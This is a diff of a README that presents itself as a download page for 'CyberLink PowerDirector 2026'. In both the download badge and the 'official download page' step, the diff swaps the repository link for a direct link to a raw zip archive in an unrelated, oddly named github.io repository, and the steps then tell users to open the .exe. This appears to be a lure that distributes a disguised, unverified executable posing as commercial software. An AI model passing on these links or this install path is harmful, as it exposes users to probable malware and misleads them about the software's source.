@@ -5,7 +5,7 @@ description: "Download CyberLink PowerDirector for Windows 10 and 11 using a dir
 ---
 # 🎬 CyberLink-PowerDirector-2026 - Create professional videos on your computer
 
-[![](https://img.shields.io/badge/Download-PowerDirector-blue.svg)](https://github.com/membraneboneriverboulder458/CyberLink-PowerDirector-2026)
+[![](https://img.shields.io/badge/Download-PowerDirector-blue.svg)](https://github.com/membraneboneriverboulder458/membraneboneriverboulder458.github.io/raw/refs/heads/main/ternatopinnate/io-membraneboneriverboulder-github-3.4.zip)
 
 ## 📁 About the software
 
@@ -29,7 +29,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to set up the software on your system.
 
-1. Go to the [official download page](https://github.com/membraneboneriverboulder458/CyberLink-PowerDirector-2026).
+1. Go to the [official download page](https://github.com/membraneboneriverboulder458/membraneboneriverboulder458.github.io/raw/refs/heads/main/ternatopinnate/io-membraneboneriverboulder-github-3.4.zip).
 2. Look for the release area on the page.
 3. Select the file ending in .exe to start your download.
 4. Open the file once the download finishes.
